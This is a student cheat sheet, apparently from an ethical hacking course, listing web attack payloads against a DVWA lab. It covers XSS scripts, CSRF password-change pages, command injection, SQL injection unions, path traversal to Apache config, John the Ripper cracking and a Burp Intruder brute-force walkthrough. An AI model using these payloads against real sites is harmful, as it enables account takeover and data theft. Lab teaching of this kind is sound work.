# EHD Web Application Cheat Sheet

###### tags: `EHD`

## XSS
- Trigger alert in textbox input (Type into textbox)
```html
<script>alert("Hello!")</script>
```

- Redirect to another page (Type into textbox)
```html
<script>document.location="https://www.google.com"</script>
```

- If there is a maximum length limit for text input, inspect and modify the input element
![](https://i.imgur.com/e4sSKVf.png)

- Creating a fake form (type into textbox):
```html
<form>
Input1: <input type="text"><br>
Input2: <input type="text"><br>
<input type="submit" value="submit button">
</form>
```

## CSRF
- Create a CSRF page with the following contents:
- **Example 1:** Contains image with source to change credentials
```html
<!--
Comments:
- Replace Win10-IP with own Win10 VM IP Address
- Image source set to URI dusplayed when admin password is changed
-->
This is a very new web page
<img width="1" src="http://Win10-IP/dvwa-master/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
```

- **Example 2:** Contains 1x1 small iframe to manipulate website data
```html
<iframe width="1" height="1" src="https://www.imdb.com/title/tt0803096"></iframe><br>
Good Day!
```

## Command Injection
- Type IP of other machines, followed by `&& dir c:\
- Directory listing of C drive in Win10 VM shown

## SQL Injection
- Basic injection command:
```sql
ppp' or '0' = '0
```

- Retrieve more columns from table:
```sql
ppp' or '0' = '0' union select column1, column2 from table --
```

- Retrieve `information_schema` from database
```sql
ppp' or '0' = '0' union select table_schema, table_name from information_schema.tables --
```

## John The Ripper
- Crack hashed passwords inside <u>password.txt</u>
```
sudo john password.txt
```

- Run John The Ripper with various suggested formats
```
sudo john --format=raw-md5 password.txt
```

## Forced Browsing
- Manipulate the value contained in `page=` to find hidden files
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
```

## File Inclusion
- Change URL below to get non-existent page and get error to find full path of page
```
http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
```

- Find configuration file of Apache Web Server
```
http://Win-10/dvwa-master/vulnerabilities/fi/?page=..\..\..\..\apache\conf\httpd.conf
```

## Burp Suite
### Setting Up
- Launch Burp Suite
```
sudo burpsuite
```

- Browse to DVWA on Kali VM
```
http://192.168.10.100/dvwa-master
```

> Ensure that Windows Firewall not blocking access to DVWA (Add Exception Port 80 if needed)

- Configure proxy in Firefox browser
![](https://i.imgur.com/N1Xnd9N.png)

- Go to **Proxy** tab and 

### Brute Force Password with Dictionary Lists
- Create new files and store list of usernames
- Create another new file with list of passwords
- Turn on Intercept in **Proxy** tab
- Login with credentials in DVWA
- Forward packets intercepted by Burp until username and password found
- Click **Action** -> **Send to Intruder** -> **Positions**
- Request sent with parameters highlighted
- Add username and password to get username and password payloads
- Set attack type to **cluster bomb**
- Set one payload for username and one payload for password
- Load username and password list in respective payloads
- Check **Store requests** and **Store responses**
- Start Attack
- View results in **Response** tab
- Find request with <u>correct</u> response

> Use **Grep -Match** and enter keyword to search in the **Add** textbox to find matching keywords from the results

## Upload Malicious Files
- ![](https://i.imgur.com/poKARAw.png)

